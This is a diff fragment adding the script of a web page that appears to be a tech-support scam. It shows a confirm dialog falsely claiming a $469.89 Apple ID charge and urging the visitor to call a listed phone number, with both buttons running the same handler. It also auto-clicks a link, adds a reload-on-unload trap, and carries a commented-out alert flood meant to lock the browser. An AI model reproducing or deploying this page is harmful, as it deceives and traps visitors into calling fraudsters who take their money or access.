+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $469.89 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-844-659-3342 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+</body>
+
+
+</html>
